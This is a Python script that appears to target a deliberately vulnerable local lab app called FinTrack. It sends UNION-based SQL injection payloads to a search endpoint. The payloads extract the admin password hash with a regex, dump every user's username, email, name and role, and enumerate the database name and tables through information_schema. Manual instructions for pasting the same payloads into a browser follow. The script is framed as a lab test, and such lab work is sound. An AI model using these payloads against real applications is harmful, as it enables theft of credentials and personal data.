#!/usr/bin/env python3
"""
SQL Injection Test Script for FinTrack
This script demonstrates how to exploit the UNION-based SQL injection vulnerability
"""

import requests
import urllib.parse

BASE_URL = "http://localhost:3206"

def test_sql_injection():
    """Test various SQL injection payloads"""
    
    print("🔍 Testing SQL Injection Vulnerability in FinTrack")
    print("=" * 60)
    
    # Test 1: Basic UNION injection to get admin password
    print("\n1️⃣ Testing UNION injection to extract admin password:")
    
    payload = "' UNION SELECT 1,2,3,4,5,6,7 FROM users WHERE xyz_username='admin' -- "
    encoded_payload = urllib.parse.quote(payload)
    
    url = f"{BASE_URL}/lab?search={encoded_payload}&debug=true"
    print(f"URL: {url}")
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("✅ Request successful")
            if "admin" in response.text:
                print("✅ Admin data found in response")
            else:
                print("❌ Admin data not found")
        else:
            print(f"❌ Request failed: {response.status_code}")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    # Test 2: Extract password hash from admin user
    print("\n2️⃣ Testing password hash extraction:")
    
    payload = "' UNION SELECT 1,2,abc_password_hash,4,5,6,7 FROM users WHERE xyz_username='admin' -- "
    encoded_payload = urllib.parse.quote(payload)
    
    url = f"{BASE_URL}/lab?search={encoded_payload}&debug=true"
    print(f"URL: {url}")
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("✅ Request successful")
            if "$2y$10$" in response.text:
                print("✅ Password hash found in response")
                # Extract hash from response
                import re
                hash_match = re.search(r'\$2y\$10\$[a-zA-Z0-9./]{53}', response.text)
                if hash_match:
                    print(f"🔑 Extracted hash: {hash_match.group()}")
            else:
                print("❌ Password hash not found")
        else:
            print(f"❌ Request failed: {response.status_code}")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    # Test 3: Test with simple injection to verify it works
    print("\n3️⃣ Testing simple injection verification:")
    
    payload = "' UNION SELECT 1,'INJECTED_USER','injected@test.com','INJECTED_NAME','admin','IT','2024-01-01' -- "
    encoded_payload = urllib.parse.quote(payload)
    
    url = f"{BASE_URL}/lab?search={encoded_payload}&debug=true"
    print(f"URL: {url}")
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("✅ Request successful")
            if "INJECTED" in response.text:
                print("✅ Injection successful - INJECTED data found")
            else:
                print("❌ Injection failed - INJECTED data not found")
        else:
            print(f"❌ Request failed: {response.status_code}")
    except Exception as e:
        print(f"❌ Error: {e}")

def manual_test_instructions():
    """Print manual testing instructions"""
    print("\n" + "=" * 60)
    print("📋 MANUAL TESTING INSTRUCTIONS")
    print("=" * 60)
    
    print("\n1. Open your browser and go to: http://localhost:3206/lab")
    print("2. Check the 'Debug Mode' checkbox")
    print("3. Try these payloads in the search field:")
    
    payloads = [
        "Test simple injection: ' UNION SELECT 1,'INJECTED','test@test.com','INJECTED_NAME','admin','IT','2024-01-01' -- ",
        "Extract admin password: ' UNION SELECT 1,2,abc_password_hash,4,5,6,7 FROM users WHERE xyz_username='admin' -- ",
        "Get all users: ' UNION SELECT 1,xyz_username,def_email,ghi_full_name,jkl_role,stu_department,mno_created_at FROM users -- ",
        "Test database name: ' UNION SELECT 1,2,3,4,5,6,DATABASE() -- ",
        "Test table names: ' UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables -- "
    ]
    
    for i, payload in enumerate(payloads, 1):
        print(f"\n   {i}. {payload}")
    
    print("\n4. Look for the red 'Debug: Raw Data' sections in the results")
    print("5. Check the browser's developer console for any errors")

if __name__ == "__main__":
    test_sql_injection()
    manual_test_instructions() 